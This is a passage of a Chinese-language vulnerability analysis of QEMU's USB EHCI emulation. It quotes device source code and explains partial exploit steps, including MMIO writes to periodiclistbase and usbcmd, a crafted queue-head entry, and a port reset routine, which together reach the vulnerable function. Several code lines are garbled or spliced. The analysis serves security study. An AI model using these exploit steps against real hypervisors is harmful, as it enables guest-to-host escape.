                /* ignore additional output */
            }
            break;
        case SETUP_STATE_DATA:
            if (!(s->setup_buf[0] & USB_DIR_IN)) {
                int len = s->setup_len - s->setup_index;
                if (len > p->iov.size) {
                    len = p->iov.size;
                }
                usb_packet_copy(p, s->data_buf + s->setup_index, len);// setup_index += len;
                if (s->setup_index >= s->setup_len) {
                    s->setup_state = SETUP_STATE_ACK;
                }
                return;
            }
            s->setup_state = SETUP_STATE_IDLE;
            p->status = USB_RET_STALL;
            break;
        default:
            p->status = USB_RET_STALL;
        }
    }
do_token_out中的usb_packet_copy 最终会调用到 iov_to_buf:
    static inline size_t
    iov_to_buf(const struct iovec *iov, const unsigned int iov_cnt,
               size_t offset, void *buf, size_t bytes)
    {
        if (__builtin_constant_p(bytes) && iov_cnt &&
            offset 
#### （2）set_EHCIState()
首先通过mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,
0); 映射到usb 设备的内存。
对usb的初始化中，对 EHCIState 结构中的opreg 的基地址设置在这块内存的偏移0x20。
    static void usb_ehci_pci_init(Object *obj)
    {
        DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);
        EHCIPCIState *i = PCI_EHCI(obj);
        EHCIState *s = &i->ehci;
        s->caps[0x09] = 0x68;        /* EECP */
        s->capsbase = 0x00;
        s->opregbase = 0x20;   // portscbase = 0x44;
        s->portnr = NB_PORTS;
        if (!dc->hotpluggable) {
            s->companion_enable = true;
        }
        usb_ehci_init(s, DEVICE(obj));
    }
对这块内存操作可以直接设置opreg的内容。opreg的内容包括：
    union {
            uint32_t opreg[0x44/sizeof(uint32_t)];
            struct {
                uint32_t usbcmd;
                uint32_t usbsts;
                uint32_t usbintr;
                uint32_t frindex;
                uint32_t ctrldssegment;
                uint32_t periodiclistbase;
                uint32_t asynclistaddr;
                uint32_t notused[9];
                uint32_t configflag;
            };
        };
在usb_ehci_init 函数中又注册了对opreg区域读写的操作函数。
    void usb_ehci_init(EHCIState *s, DeviceState *dev)
    {
        /* 2.2 host controller interface version */
        s->caps[0x00] = (uint8_t)(s->opregbase - s->capsbase);
        s->caps[0x01] = 0x00;
        s->caps[0x02] = 0x00;
        s->caps[0x03] = 0x01;        /* HC version */
        s->caps[0x04] = s->portnr;   /* Number of downstream ports */
        s->caps[0x05] = 0x00;        /* No companion ports at present */
        s->caps[0x06] = 0x00;
        s->caps[0x07] = 0x00;
        s->caps[0x08] = 0x80;        /* We can cache whole frame, no 64-bit */
        s->caps[0x0a] = 0x00;
        s->caps[0x0b] = 0x00;
        QTAILQ_INIT(&s->aqueues);
        QTAILQ_INIT(&s->pqueues);
        usb_packet_init(&s->ipacket);
        memory_region_init(&s->mem, OBJECT(dev), "ehci", MMIO_SIZE);
        memory_region_init_io(&s->mem_caps, OBJECT(dev), &ehci_mmio_caps_ops, s,
                              "capabilities", CAPA_SIZE);
        memory_region_init_io(&s->mem_opreg, OBJECT(dev), &ehci_mmio_opreg_ops, s,
                              "operational", s->portscbase);
        memory_region_init_io(&s->mem_ports, OBJECT(dev), &ehci_mmio_port_ops, s,
                              "ports", 4 * s->portnr);
        memory_region_add_subregion(&s->mem, s->capsbase, &s->mem_caps);
        memory_region_add_subregion(&s->mem, s->opregbase, &s->mem_opreg);
        memory_region_add_subregion(&s->mem, s->opregbase + s->portscbase,
                                    &s->mem_ports);
    }
    static const MemoryRegionOps ehci_mmio_opreg_ops = {
        .read = ehci_opreg_read,
        .write = ehci_opreg_write,
        .valid.min_access_size = 4,
        .valid.max_access_size = 4,
        .endianness = DEVICE_LITTLE_ENDIAN,
    };
所以对opreg的写操作会调用到ehci_opreg_write函数，如 mmio_write(0x20, 0xddaa);
会调用ehci_opreg_write，此时传入的addr为0（0x20-0x20=0），表示对opreg的偏移0，后续根据addr进行选择处理，0进入USBCMD流程，即对usbcmd进行覆写，将EHCIState->usbcmd
改写成0xddaa。
    static void ehci_opreg_write(void *ptr, hwaddr addr,
                                 uint64_t val, unsigned size)
    {
        EHCIState *s = ptr;
        uint32_t *mmio = s->opreg + (addr >> 2);
        uint32_t old = *mmio;
        int i;
        trace_usb_ehci_opreg_write(addr + s->opregbase, addr2str(addr), val);
        switch (addr) {
        case USBCMD:
            if (val & USBCMD_HCRESET) {
                ehci_reset(s);
                val = s->usbcmd;
                break;
            }
下面讲讲set_EHCIState的目的，分别设置opreg的 periodiclistbase和usbcmd 字段：
    void set_EHCIState(){
        mmio_write(0x34, virt2phys(dmabuf)); // periodiclistbase
        mmio_write(0x20, USBCMD_RUNSTOP | USBCMD_PSE); // usbcmd
        sleep(1);
    }
漏洞函数触发的调用链如下：
    ► f 0     5597194507ac do_token_setup+16
       f 1     5597194511ce usb_process_one+134
       f 2     5597194513d9 usb_handle_packet+331
       f 3     559719469769 ehci_execute+616
       f 4     55971946ab96 ehci_state_execute+257
       f 5     55971946b0a1 ehci_advance_state+522
       f 6     55971946b4f1 ehci_advance_periodic_state+352
       f 7     55971946b7f4 ehci_work_bh+422   pstate != EST_INACTIVE)
                                ……
     ->
    static inline bool ehci_periodic_enabled(EHCIState *s)
    {
        return ehci_enabled(s) && (s->usbcmd & USBCMD_PSE); // 
    static inline bool ehci_enabled(EHCIState *s)
    {
        return s->usbcmd & USBCMD_RUNSTOP;   //astate != EST_INACTIVE) {
            need_timer++;
            ehci_advance_async_state(ehci);
        }
所以要设置usbcmd为USBCMD_RUNSTOP | USBCMD_PSE 进入ehci_advance_periodic_state。
    static void ehci_advance_periodic_state(EHCIState *ehci)
    {
        uint32_t entry;
        uint32_t list;
        const int async = 0;
        // 4.6
        switch(ehci_get_state(ehci, async)) {
        case EST_INACTIVE:
            if (!(ehci->frindex & 7) && ehci_periodic_enabled(ehci)) {
                ehci_set_state(ehci, async, EST_ACTIVE);
                // No break, fall through to ACTIVE
            } else
                break;
        case EST_ACTIVE:
            if (!(ehci->frindex & 7) && !ehci_periodic_enabled(ehci)) {
                ehci_queues_rip_all(ehci, async);
                ehci_set_state(ehci, async, EST_INACTIVE);
                break;
            }
            list = ehci->periodiclistbase & 0xfffff000; 【1】frindex & 0x1ff8) >> 1); 【2】 %08X\n",
                    ehci->frindex / 8, list, entry);
            ehci_set_fetch_addr(ehci, async,entry); 【3】pstate);
            g_assert_not_reached();
        }
    }
【1】处ehci->periodiclistbase已经被我们填充为dmabuf的物理地址，得到的list经过【2】处处理后相当于list =
virt2phys(dmabuf)+4，之后通过【3】处ehci_set_fetch_addr函数将list上的内容，即virt2phys(qh)+0x2写入s->p_fetch_addr。
    static void ehci_set_fetch_addr(EHCIState *s, int async, uint32_t addr)
    {
        if (async) {
            s->a_fetch_addr = addr;
        } else {
            s->p_fetch_addr = addr;
        }
    }
get_dwords将list上的内容写入entry，所以我们在dmabuf + 4 填充了virt2phys(qh)+0x2; 作为entry。
    entry = dmabuf + 4;
    *entry = virt2phys(qh)+0x2;
这里entry为什么要+2呢？回到源码，ehci_advance_periodic_state调用到ehci_advance_state：
    static void ehci_advance_state(EHCIState *ehci, int async)
    {
        EHCIQueue *q = NULL;
        int itd_count = 0;
        int again;
        do {
            switch(ehci_get_state(ehci, async)) {
            case EST_WAITLISTHEAD:
                again = ehci_state_waitlisthead(ehci, async);
                break;
            case EST_FETCHENTRY:
                again = ehci_state_fetchentry(ehci, async);
                break;
            case EST_FETCHQH:
                q = ehci_state_fetchqh(ehci, async);
                if (q != NULL) {
                    assert(q->async == async);
                    again = 1;
                } else {
                    again = 0;
                }
                break;
                    ……
我们需要最终运行到EST_FETCHQH，得到qh结构。
do-while循环里第一次运行到EST_FETCHENTRY，通过ehci_state_fetchentry得到entry，即s->p_fetch_addr，我们之前填充的virt2phys(qh)+0x2。
    static int ehci_state_fetchentry(EHCIState *ehci, int async)
    {
        int again = 0;
        uint32_t entry = ehci_get_fetch_addr(ehci, async);
        if (NLPTR_TBIT(entry)) {
            ehci_set_state(ehci, async, EST_ACTIVE);
            goto out;
        }
        /* section 4.8, only QH in async schedule */
        if (async && (NLPTR_TYPE_GET(entry) != NLPTR_TYPE_QH)) {
            fprintf(stderr, "non queue head request in async schedule\n");
            return -1;
        }
        switch (NLPTR_TYPE_GET(entry)) {
        case NLPTR_TYPE_QH:
            ehci_set_state(ehci, async, EST_FETCHQH);
            again = 1;
            break;
在switch (NLPTR_TYPE_GET(entry)) 判断下，我们要进入case
NLPTR_TYPE_QH，通过ehci_set_state(ehci, async, EST_FETCHQH)， 使得下次do-while循环中运行到EST_FETCHQH，得到qh结构。而NLPTR_TYPE_GET 宏定义内容如下：
    #define NLPTR_TYPE_QH            1     // queue head
    #define NLPTR_TYPE_GET(x)        (((x) >> 1) & 3)
所以需要将entry的内容填充为virt2phys(qh)+0x2，因为(((2) >> 1) & 3) =1。
之后ehci_state_fetchqh 会为entry分配空间，
最终ehci_advance_state得到EHCIqh的地址，然后调用ehci_state_execute，触发到漏洞函数。
#### （3） reset and enable port
    void reset_enable_port(){
        mmio_write(0x64, PORTSC_PRESET);
        mmio_write(0x64, PORTSC_PED);
    }
0x64 的偏移对应到 portsc，对该字段写操作会调用到ehci_port_write：
    static void ehci_port_write(void *ptr, hwaddr addr,
                                uint64_t val, unsigned size)